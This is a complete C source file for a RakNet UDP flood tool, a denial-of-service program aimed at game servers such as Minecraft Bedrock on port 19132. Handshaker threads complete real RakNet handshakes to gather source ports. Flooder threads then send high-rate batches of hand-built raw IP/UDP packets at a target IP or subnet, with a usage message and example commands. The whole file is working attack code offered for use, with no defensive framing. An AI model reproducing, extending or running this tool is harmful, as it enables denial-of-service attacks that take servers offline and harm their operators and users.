#define _GNU_SOURCE
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/epoll.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sched.h>
static unsigned int target_port;
static unsigned int target_base;
static int target_count;
static unsigned int src_ip;
volatile int running = 1;
static void handle_sig(int sig) { (void)sig; running = 0; }
static unsigned long xorshift64(unsigned long *s)
{
	unsigned long x = *s;
	x ^= x << 13; x ^= x >> 7; x ^= x << 17;
	*s = x;
	return x;
}
static const unsigned char default_magic[16] = {
	0x00,0xFF,0xFF,0x00,0xFE,0xFE,0xFE,0xFE,
	0xFD,0xFD,0xFD,0xFD,0x12,0x34,0x56,0x78
};
static const unsigned char *magic = default_magic;
#define ID_UNCONNECTED_PING         0x01
#define ID_UNCONNECTED_PONG         0x1C
#define ID_OPEN_CONNECTION_REQ_1    0x05
#define ID_OPEN_CONNECTION_REPLY_1  0x06
#define ID_OPEN_CONNECTION_REQ_2    0x07
#define ID_OPEN_CONNECTION_REPLY_2  0x08
#define ID_CONNECTION_REQUEST       0x09
#define ID_CONNECTION_REQUEST_ACCEPTED 0x10
static volatile unsigned long g_datagrams;
static int g_total_hs;
static volatile int g_next_cpu;
static int g_pkt_len = 500;
#define POOL_MASK 65535
#define POOL_SIZE 65536
struct conn_info {
	unsigned short sport;
	unsigned int seq;
	unsigned int midx;
};
struct pool {
	struct conn_info entries[POOL_SIZE];
	volatile unsigned int head;
	volatile unsigned int tail;
};
static int pool_push(struct pool *p, struct conn_info *c)
{
	unsigned int t = __sync_fetch_and_add(&p->tail, 1);
	unsigned int idx = t & POOL_MASK;
	if (idx == (p->head & POOL_MASK)) { __sync_fetch_and_sub(&p->tail, 1); return 0; }
	memcpy(&p->entries[idx], c, sizeof(*c));
	__sync_synchronize();
	return 1;
}
static int pool_pop(struct pool *p, struct conn_info *c)
{
	unsigned int h;
	do {
		h = p->head;
		if (h == p->tail) return 0;
	} while (!__sync_bool_compare_and_swap(&p->head, h, h + 1));
	memcpy(c, &p->entries[h & POOL_MASK], sizeof(*c));
	__sync_synchronize();
	return 1;
}
static struct pool g_pool;
static struct pool g_dead;
static void pin_cpu(void)
{
	int ncpu = sysconf(_SC_NPROCESSORS_ONLN);
	if (ncpu < 1) return;
	int cpu = __sync_fetch_and_add(&g_next_cpu, 1) % ncpu;
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
}
#define HS_CONNS 512
#define HS_TIMEOUT_NS 5000000000LL
static inline void deadline_add_ns(struct timespec *ts, long ns)
{
	ts->tv_nsec += ns;
	while (ts->tv_nsec >= 1000000000LL) { ts->tv_sec++; ts->tv_nsec -= 1000000000LL; }
}
struct hs_conn {
	int fd;
	int state;
	unsigned short sport;
	uint64_t server_guid;
	uint64_t client_guid;
	struct sockaddr_in addr;
	struct timespec deadline;
};
static void hs_send_ping(struct hs_conn *hc, unsigned long *rng)
{
	unsigned char b[33];
	b[0] = ID_UNCONNECTED_PING;
	uint64_t ts = (uint64_t)time(NULL) * 1000 + (xorshift64(rng) % 1000);
	memcpy(b + 1, &ts, 8);
	memcpy(b + 9, magic, 16);
	hc->client_guid = xorshift64(rng) ^ ((uint64_t)xorshift64(rng) << 32);
	memcpy(b + 25, &hc->client_guid, 8);
	sendto(hc->fd, b, 33, 0, (struct sockaddr *)&hc->addr, sizeof(hc->addr));
	hc->state = 1;
}
static void hs_send_open1(struct hs_conn *hc)
{
	unsigned char b[18] = { ID_OPEN_CONNECTION_REQ_1 };
	memcpy(b + 1, magic, 16);
	b[17] = 11;
	sendto(hc->fd, b, 18, 0, (struct sockaddr *)&hc->addr, sizeof(hc->addr));
	hc->state = 2;
}
static void hs_send_open2(struct hs_conn *hc)
{
	unsigned char b[33];
	b[0] = ID_OPEN_CONNECTION_REQ_2;
	memcpy(b + 1, magic, 16);
	memcpy(b + 17, &hc->addr.sin_addr.s_addr, 4);
	uint16_t pp = htons(target_port);
	memcpy(b + 21, &pp, 2);
	uint16_t mtu = 1400;
	memcpy(b + 23, &mtu, 2);
	memcpy(b + 25, &hc->client_guid, 8);
	sendto(hc->fd, b, 33, 0, (struct sockaddr *)&hc->addr, sizeof(hc->addr));
	hc->state = 3;
}
static void hs_send_con_req(struct hs_conn *hc)
{
	unsigned char b[26];
	b[0] = ID_CONNECTION_REQUEST;
	memcpy(b + 1, &hc->server_guid, 8);
	memcpy(b + 9, &hc->client_guid, 8);
	uint64_t ts = (uint64_t)time(NULL) * 1000;
	memcpy(b + 17, &ts, 8);
	b[25] = 0;
	sendto(hc->fd, b, 26, 0, (struct sockaddr *)&hc->addr, sizeof(hc->addr));
	hc->state = 4;
}
static void *handshaker_thread(void *arg)
{
	unsigned long tid = (unsigned long)arg;
	pin_cpu();
	unsigned long rng = time(NULL) ^ (tid << 13) ^ 0xDEAD;
	struct hs_conn hcs[HS_CONNS];
	struct epoll_event ev, events[HS_CONNS];
	int epfd = epoll_create1(0);
	struct sockaddr_in srv_addr = {
		.sin_family = AF_INET,
		.sin_port = htons(target_port),
		.sin_addr.s_addr = 0
	};
	int ports_per_hs = (64500 - 1024) / (g_total_hs > 0 ? g_total_hs : 1);
	unsigned short base_port = 1024 + tid * ports_per_hs;
	for (int i = 0; i < HS_CONNS; i++) {
		hcs[i].fd = -1;
		hcs[i].state = 0;
		hcs[i].sport = base_port + i;
	}
	int next_idle = 0;
	while (running) {
		for (int attempt = 0; attempt < HS_CONNS / 16; attempt++) {
			int i = next_idle;
			next_idle = (next_idle + 1) % HS_CONNS;
			if (hcs[i].state != 0) continue;
			struct conn_info dead_ci;
			if (pool_pop(&g_dead, &dead_ci))
				hcs[i].sport = dead_ci.sport;
			else
				hcs[i].sport = base_port + (xorshift64(&rng) % 50000);
			int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
			if (fd < 0) continue;
			int reuse = 1;
			setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
			setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
			struct sockaddr_in local = {
				.sin_family = AF_INET,
				.sin_port = htons(hcs[i].sport),
				.sin_addr.s_addr = src_ip
			};
			if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {
				close(fd);
				continue;
			}
			unsigned int dst = target_base + (xorshift64(&rng) % target_count);
			hcs[i].fd = fd;
			hcs[i].addr = srv_addr;
			hcs[i].addr.sin_addr.s_addr = dst;
			clock_gettime(CLOCK_MONOTONIC, &hcs[i].deadline);
			ev.events = EPOLLIN;
			ev.data.u32 = i;
			epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
			hs_send_ping(&hcs[i], &rng);
			deadline_add_ns(&hcs[i].deadline, HS_TIMEOUT_NS);
		}
		int nfds = epoll_wait(epfd, events, HS_CONNS, 10);
		if (nfds < 0) { usleep(1000); continue; }
		struct timespec now;
		clock_gettime(CLOCK_MONOTONIC, &now);
		for (int n = 0; n < nfds; n++) {
			int i = events[n].data.u32;
			struct hs_conn *hc = &hcs[i];
			if (events[n].events & EPOLLIN) {
				unsigned char buf[512];
				struct sockaddr_in from;
				socklen_t fl = sizeof(from);
				int r = recvfrom(hc->fd, buf, sizeof(buf), 0,
				                 (struct sockaddr *)&from, &fl);
				if (r < 0) continue;
				switch (hc->state) {
				case 1:
					if (r >= 25 && buf[0] == ID_UNCONNECTED_PONG) {
						memcpy(&hc->server_guid, buf + 9, 8);
						hs_send_open1(hc);
						clock_gettime(CLOCK_MONOTONIC, &hc->deadline);
						deadline_add_ns(&hc->deadline, HS_TIMEOUT_NS);
					}
					break;
				case 2:
					if (r >= 23 && buf[0] == ID_OPEN_CONNECTION_REPLY_1) {
						hs_send_open2(hc);
						clock_gettime(CLOCK_MONOTONIC, &hc->deadline);
						deadline_add_ns(&hc->deadline, HS_TIMEOUT_NS);
					}
					break;
				case 3:
					if (r >= 28 && buf[0] == ID_OPEN_CONNECTION_REPLY_2) {
						hs_send_con_req(hc);
						clock_gettime(CLOCK_MONOTONIC, &hc->deadline);
						deadline_add_ns(&hc->deadline, HS_TIMEOUT_NS);
					}
					break;
				case 4:
					if (r >= 30 && buf[0] == ID_CONNECTION_REQUEST_ACCEPTED) {
						struct conn_info ci = {
							.sport = hc->sport,
							.seq = xorshift64(&rng) & 0x7FFFFFFF,
							.midx = xorshift64(&rng) & 0x7FFFFFFF
						};
						pool_push(&g_pool, &ci);
						hc->state = 0;
						epoll_ctl(epfd, EPOLL_CTL_DEL, hc->fd, NULL);
						close(hc->fd);
						hc->fd = -1;
					}
					break;
				}
			}
		}
		for (int i = 0; i < HS_CONNS; i++) {
			struct hs_conn *hc = &hcs[i];
			if (hc->state == 0) continue;
			if (now.tv_sec > hc->deadline.tv_sec ||
			    (now.tv_sec == hc->deadline.tv_sec &&
			     now.tv_nsec >= hc->deadline.tv_nsec)) {
				epoll_ctl(epfd, EPOLL_CTL_DEL, hc->fd, NULL);
				close(hc->fd);
				hc->fd = -1;
				hc->state = 0;
			}
		}
	}
	return NULL;
}
#define FLOOD_LOCAL 512
#define FLOOD_BATCH 16
#define RECYCLE_AFTER 500
static void *flooder_thread(void *arg)
{
	pin_cpu();
	unsigned long rng = time(NULL) ^ ((unsigned long)arg << 11) ^ 0xF00D;
	unsigned char bufs[FLOOD_BATCH][576] __attribute__((aligned(64)));
	struct conn_info local[FLOOD_LOCAL];
	int local_count = 0;
	int local_next = 0;
	unsigned int local_sends[FLOOD_LOCAL];
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
	int hdr = 1;
	setsockopt(s, IPPROTO_IP, IP_HDRINCL, &hdr, sizeof(hdr));
	int sndbuf = 4194304;
	setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
	struct mmsghdr mv[FLOOD_BATCH];
	struct iovec iv[FLOOD_BATCH];
	struct sockaddr_in sin = {
		.sin_family = AF_INET,
		.sin_port = htons(target_port),
		.sin_addr.s_addr = 0
	};
	while (running) {
		while (local_count < FLOOD_LOCAL) {
			struct conn_info ci;
			if (!pool_pop(&g_pool, &ci)) break;
			local[local_count] = ci;
			local_sends[local_count] = 0;
			local_count++;
		}
		if (local_count == 0) {
			for (int b = 0; b < FLOOD_BATCH; b++) {
				unsigned char *pkt = bufs[b];
				iv[b].iov_base = pkt;
				iv[b].iov_len = 0;
				mv[b].msg_hdr.msg_iov = &iv[b];
				mv[b].msg_hdr.msg_iovlen = 1;
				unsigned int dst = target_base + (xorshift64(&rng) % target_count);
				sin.sin_addr.s_addr = dst;
				mv[b].msg_hdr.msg_name = &sin;
				mv[b].msg_hdr.msg_namelen = sizeof(sin);
				struct iphdr *ip = (struct iphdr *)pkt;
				unsigned short sport = 1024 + (xorshift64(&rng) % 64511);
				int pos = 28, plen;
				switch (xorshift64(&rng) % 5) {
				case 0: case 1:
					plen = 33;
					pkt[28] = 0x01;
					uint64_t ts = (uint64_t)time(NULL) * 1000 + (xorshift64(&rng) % 1000);
					memcpy(pkt + 29, &ts, 8);
					memcpy(pkt + 37, magic, 16);
					uint64_t guid = xorshift64(&rng) ^ ((uint64_t)xorshift64(&rng) << 32);
					memcpy(pkt + 53, &guid, 8);
					pos = 28 + plen;
					break;
				case 2:
					plen = 18;
					pkt[28] = 0x05;
					memcpy(pkt + 29, magic, 16);
					pkt[45] = 11;
					pos = 28 + plen;
					break;
				case 3:
					plen = 33;
					pkt[28] = 0x07;
					memcpy(pkt + 29, magic, 16);
					memcpy(pkt + 45, &dst, 4);
					uint16_t pp = htons(target_port);
					memcpy(pkt + 49, &pp, 2);
					uint16_t mtu = 1400;
					memcpy(pkt + 51, &mtu, 2);
					uint64_t cg = xorshift64(&rng) ^ ((uint64_t)xorshift64(&rng) << 32);
					memcpy(pkt + 53, &cg, 8);
					pos = 28 + plen;
					break;
				default:
					plen = 26;
					pkt[28] = 0x09;
					uint64_t sg = xorshift64(&rng);
					memcpy(pkt + 29, &sg, 8);
					uint64_t cg2 = xorshift64(&rng) ^ ((uint64_t)xorshift64(&rng) << 32);
					memcpy(pkt + 37, &cg2, 8);
					uint64_t ts2 = (uint64_t)time(NULL) * 1000;
					memcpy(pkt + 45, &ts2, 8);
					pkt[53] = 0;
					pos = 28 + plen;
					break;
				}
				int tot = pos;
				ip->ihl = 5;
				ip->version = 4;
				ip->tos = xorshift64(&rng) & 0xFF;
				ip->tot_len = htons(tot);
				ip->id = htons(xorshift64(&rng) & 0xFFFF);
				ip->frag_off = 0;
				ip->ttl = 32 + (xorshift64(&rng) % 96);
				ip->protocol = IPPROTO_UDP;
				ip->saddr = src_ip;
				ip->daddr = dst;
				ip->check = 0;
				{ unsigned short *w = (unsigned short *)ip;
				  unsigned long sum = 0;
				  sum += w[0]; sum += w[1]; sum += w[2]; sum += w[3]; sum += w[4];
				  sum += w[5]; sum += w[6]; sum += w[7]; sum += w[8]; sum += w[9];
				  while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
				  ip->check = ~sum; }
				struct udphdr *udp = (struct udphdr *)(pkt + 20);
				udp->source = htons(sport);
				udp->dest = htons(target_port);
				udp->len = htons(tot - 20);
				udp->check = 0;
				iv[b].iov_len = tot;
			}
			int sent = sendmmsg(s, mv, FLOOD_BATCH, 0);
			if (sent > 0) __sync_fetch_and_add(&g_datagrams, sent);
			if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) usleep(100);
			continue;
		}
		int count = 0;
		for (int b = 0; b < FLOOD_BATCH; b++) {
			int cur = local_next;
			struct conn_info *ci = &local[cur];
			iv[b].iov_base = bufs[b];
			iv[b].iov_len = 0;
			mv[b].msg_hdr.msg_iov = &iv[b];
			mv[b].msg_hdr.msg_iovlen = 1;
			unsigned int dst = target_base + (xorshift64(&rng) % target_count);
			sin.sin_addr.s_addr = dst;
			mv[b].msg_hdr.msg_name = &sin;
			mv[b].msg_hdr.msg_namelen = sizeof(sin);
			if (local_sends[cur] >= RECYCLE_AFTER) {
				struct conn_info dead = { .sport = ci->sport };
				pool_push(&g_dead, &dead);
				local_count--;
				if (cur < local_count) {
					local[cur] = local[local_count];
					local_sends[cur] = local_sends[local_count];
				}
				local_next = cur < local_count ? cur : 0;
				if (local_count == 0) break;
				b--;
				continue;
			}
			local_sends[cur]++;
			local_next = (cur + 1) % local_count;
			unsigned char *pkt = bufs[b];
			struct iphdr *ip = (struct iphdr *)pkt;
			int pos = 28;
			unsigned int ds = ci->seq++;
			pkt[pos++] = ds & 0xFF;
			pkt[pos++] = (ds >> 8) & 0xFF;
			pkt[pos++] = (ds >> 16) & 0xFF;
			while (pos < g_pkt_len) {
				if (((ci->seq & 3) == 0) && (pos < g_pkt_len - 40)) {
					pkt[pos++] = 3;
					unsigned int mi = ci->midx++;
					pkt[pos++] = mi & 0xFF;
					pkt[pos++] = (mi >> 8) & 0xFF;
					pkt[pos++] = (mi >> 16) & 0xFF;
					pkt[pos++] = 0; pkt[pos++] = 0; pkt[pos++] = 0;
					pkt[pos++] = 0;
					pkt[pos++] = 0;
					uint64_t now_ms = (uint64_t)time(NULL) * 1000;
					for (int i = 0; i < 8; i++) { pkt[pos++] = now_ms & 0xFF; now_ms >>= 8; }
				} else {
					int plen = 0;
					if (xorshift64(&rng) % 100 < 30) plen = 1 + (xorshift64(&rng) % 8);
					pkt[pos++] = 1;
					unsigned short len = plen & 0x3FFF;
					pkt[pos++] = (len >> 8) & 0x3F;
					pkt[pos++] = len & 0xFF;
					unsigned int mi = ci->midx++;
					pkt[pos++] = mi & 0xFF;
					pkt[pos++] = (mi >> 8) & 0xFF;
					pkt[pos++] = (mi >> 16) & 0xFF;
					for (int i = 0; i < plen; i++)
						pkt[pos++] = xorshift64(&rng) & 0xFF;
				}
			}
			int tot = pos;
			ip->ihl = 5;
			ip->version = 4;
			ip->tos = xorshift64(&rng) & 0xFF;
			ip->tot_len = htons(tot);
			ip->id = htons(xorshift64(&rng) & 0xFFFF);
			ip->frag_off = 0;
			ip->ttl = 32 + (xorshift64(&rng) % 96);
			ip->protocol = IPPROTO_UDP;
			ip->saddr = src_ip;
			ip->daddr = dst;
			ip->check = 0;
			{
				unsigned short *w = (unsigned short *)ip;
				unsigned long sum = 0;
				sum += w[0]; sum += w[1]; sum += w[2]; sum += w[3]; sum += w[4];
				sum += w[5]; sum += w[6]; sum += w[7]; sum += w[8]; sum += w[9];
				while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
				ip->check = ~sum;
			}
			struct udphdr *udp = (struct udphdr *)(pkt + 20);
			udp->source = htons(ci->sport);
			udp->dest = htons(target_port);
			udp->len = htons(tot - 20);
			udp->check = 0;
			iv[b].iov_len = tot;
			count++;
		}
		if (count == 0) continue;
		int sent = sendmmsg(s, mv, count, 0);
		if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
			usleep(100);
			sent = sendmmsg(s, mv, count / 2, 0);
		}
		if (sent > 0) __sync_fetch_and_add(&g_datagrams, sent);
		if (sent < 0 && errno != EAGAIN && errno != EINTR) {
			for (int b = 0; b < count; b++) {
				if (mv[b].msg_hdr.msg_iov->iov_len > 0) {
					struct conn_info dead = { .sport = ntohs(((struct udphdr *)(bufs[b] + 20))->source) };
					pool_push(&g_dead, &dead);
				}
			}
		}
	}
	close(s);
	return NULL;
}
static unsigned int get_src_ip(void)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct sockaddr_in t = { .sin_family = AF_INET, .sin_port = htons(53) };
	t.sin_addr.s_addr = target_base;
	connect(fd, (struct sockaddr *)&t, sizeof(t));
	struct sockaddr_in l;
	socklen_t sz = sizeof(l);
	getsockname(fd, (struct sockaddr *)&l, &sz);
	close(fd);
	return l.sin_addr.s_addr;
}
static int parse_magic(const char *hex, unsigned char *out)
{
	int len = strlen(hex);
	if (len != 32) return -1;
	for (int i = 0; i < 16; i++) {
		char byte[3] = { hex[i*2], hex[i*2+1], 0 };
		char *e;
		long v = strtol(byte, &e, 16);
		if (*e) return -1;
		out[i] = (unsigned char)v;
	}
	return 0;
}
static int parse_cidr(const char *s, unsigned int *base, int *prefix) {
	char *slash = strchr(s, '/');
	if (!slash) return 0;
	char ip[32];
	int l = (int)(slash - s);
	if (l >= (int)sizeof(ip)) return 0;
	memcpy(ip, s, l);
	ip[l] = 0;
	if (inet_pton(AF_INET, ip, base) != 1) return 0;
	*prefix = atoi(slash + 1);
	return (*prefix >= 24 && *prefix <= 28) ? 1 : 0;
}
static void usage(const char *name) {
	fprintf(stderr,
		"Usage: %s <target> <port> <time> [-t threads] [-H handshakers] [-f flooders] [-l len] [-m magic]\n"
		"\n"
		"RakNet UDP flood with async real-handshake connections.\n"
		"Target can be a CIDR subnet /24-/28 to spread across multiple IPs.\n"
		"\n"
		"Positional:\n"
		"  target        IP or CIDR subnet (e.g. 10.0.0.1 or 10.0.0.0/24)\n"
		"  port          RakNet server port\n"
		"  time          duration in seconds\n"
		"\n"
		"Options:\n"
		"  -t N          total threads (default auto)\n"
		"  -H N          handshaker threads (default: total/9, or 4 if no -t)\n"
		"  -f N          flooder threads (default: total-handshakers, or hs*8 if no -t)\n"
		"  -l N          datagram payload size 32-576 (default 500)\n"
		"  -m <32hex>    custom RakNet server magic (16 bytes, hex)\n"
		"\n"
		"Examples:\n"
		"  sudo %s 10.0.0.1 19132 60                 # MC:BE flood, 30s\n"
		"  sudo %s -t 36 -H 4 10.0.0.0/24 19132 120  # 4 hs + 32 flooders\n"
		, name, name, name);
}
int main(int argc, char **argv)
{
	if (geteuid() != 0) { fprintf(stderr, "Root required for raw sockets\n"); return 1; }
	int n_handshakers = 0;
	int n_flooders = 0;
	int n_total = 0;
	int duration = 30;
	int pkt_len = 500;
	unsigned char custom_magic[16];
	int custom_magic_set = 0;
	int has_H = 0, has_f = 0;
	int opt;
	while ((opt = getopt(argc, argv, "t:H:f:l:m:h")) != -1) {
		switch (opt) {
		case 't': n_total       = atoi(optarg); break;
		case 'H': n_handshakers = atoi(optarg); has_H = 1; break;
		case 'f': n_flooders    = atoi(optarg); has_f = 1; break;
		case 'l': pkt_len       = atoi(optarg); break;
		case 'm':
			if (parse_magic(optarg, custom_magic) == 0) {
				magic = custom_magic;
				custom_magic_set = 1;
			} else {
				fprintf(stderr, "bad magic: 32 hex chars\n"); return 1;
			}
			break;
		case 'h': default: usage(argv[0]); return opt == 'h' ? 0 : 1;
		}
	}
	if (optind + 3 > argc) { usage(argv[0]); return 1; }
	const char *target = argv[optind];
	target_port = atoi(argv[optind + 1]);
	duration = atoi(argv[optind + 2]);
	if (target_port < 1 || target_port > 65535) { fprintf(stderr, "Invalid port\n"); return 1; }
	if (pkt_len < 32) pkt_len = 32;
	if (pkt_len > 576) pkt_len = 576;
	if (n_total > 0) {
		if (has_H && !has_f) {
			n_flooders = n_total - n_handshakers;
		} else if (has_f && !has_H) {
			n_handshakers = n_total - n_flooders;
		} else if (!has_H && !has_f) {
			n_handshakers = n_total / 9;
			if (n_handshakers < 1) n_handshakers = 1;
			n_flooders = n_total - n_handshakers;
		}
	} else {
		if (!has_H) n_handshakers = 4;
		if (!has_f) n_flooders = n_handshakers * 8;
	}
	if (n_handshakers < 1) n_handshakers = 1;
	if (n_flooders < 1) n_flooders = 1;
	g_pkt_len = pkt_len;
	unsigned int dst_base;
	int prefix;
	if (parse_cidr(target, &dst_base, &prefix)) {
		int num_hosts = 1 << (32 - prefix);
		unsigned int h = ntohl(dst_base);
		if (prefix == 28) h &= 0xFFFFFFF0;
		else if (prefix == 27) h &= 0xFFFFFFE0;
		else if (prefix == 26) h &= 0xFFFFFFC0;
		else if (prefix == 25) h &= 0xFFFFFF80;
		else h &= 0xFFFFFF00;
		target_base = htonl(h);
		target_count = num_hosts;
	} else if (strchr(target, '/')) {
		fprintf(stderr, "Invalid CIDR: use /24 to /28 only\n"); return 1;
	} else {
		target_base = inet_addr(target);
		if (!target_base || target_base == 0xFFFFFFFF) { fprintf(stderr, "Bad IP\n"); return 1; }
		target_count = 1;
	}
	src_ip = get_src_ip();
	g_total_hs = n_handshakers;
	struct sigaction sa = { .sa_handler = handle_sig };
	sigaction(SIGINT, &sa, NULL);
	sigaction(SIGTERM, &sa, NULL);
	struct in_addr ia = { .s_addr = src_ip };
	struct in_addr da = { .s_addr = target_base };
	int n_total_actual = n_handshakers + n_flooders;
	printf("Src: %s  Target: %s:%d  Thr: %d  HS: %d  Flood: %d  %ds  Pkt: %d  ",
	       inet_ntoa(ia), inet_ntoa(da), target_port, n_total_actual,
	       n_handshakers, n_flooders, duration, pkt_len);
	if (!custom_magic_set) printf("Magic: default\n");
	else {
		printf("Magic: ");
		for (int i = 0; i < 16; i++) printf("%02x", magic[i]);
		printf(" (custom)\n");
	}
	int ncpu = sysconf(_SC_NPROCESSORS_ONLN);
	printf("  Pool: %d | HS/con: %d | Flood/con: %d | Batch: %d | Recycle: %d | CPUs: %d\n",
	       POOL_SIZE, HS_CONNS, FLOOD_LOCAL, FLOOD_BATCH, RECYCLE_AFTER, ncpu);
	int total = n_handshakers + n_flooders;
	pthread_t *th = malloc(total * sizeof(pthread_t));
	int n = 0;
	for (int i = 0; i < n_handshakers && n < total; i++)
		pthread_create(&th[n++], NULL, handshaker_thread, (void*)(unsigned long)i);
	for (int i = 0; i < n_flooders && n < total; i++)
		pthread_create(&th[n++], NULL, flooder_thread, (void*)(unsigned long)i);
	printf("Established connections: ");
	unsigned long prev = 0;
	for (int t = 0; t < duration; t++) {
		sleep(1);
		if (!running) break;
		int filled = g_pool.tail - g_pool.head;
		if (filled < 0) filled += POOL_SIZE;
		if (filled > POOL_SIZE) filled = POOL_SIZE;
		int dead = g_dead.tail - g_dead.head;
		if (dead < 0) dead += POOL_SIZE;
		if (dead > POOL_SIZE) dead = POOL_SIZE;
		unsigned long cur = g_datagrams;
		unsigned long pps = cur - prev;
		prev = cur;
		printf("\r  Alive: %-5d  Dead: %-4d  Pps: %-8lu  %ds left  ",
		       filled, dead, pps, duration - t - 1);
		fflush(stdout);
	}
	running = 0;
	sleep(1);
	printf("\nDone.\n");
	return 0;
}
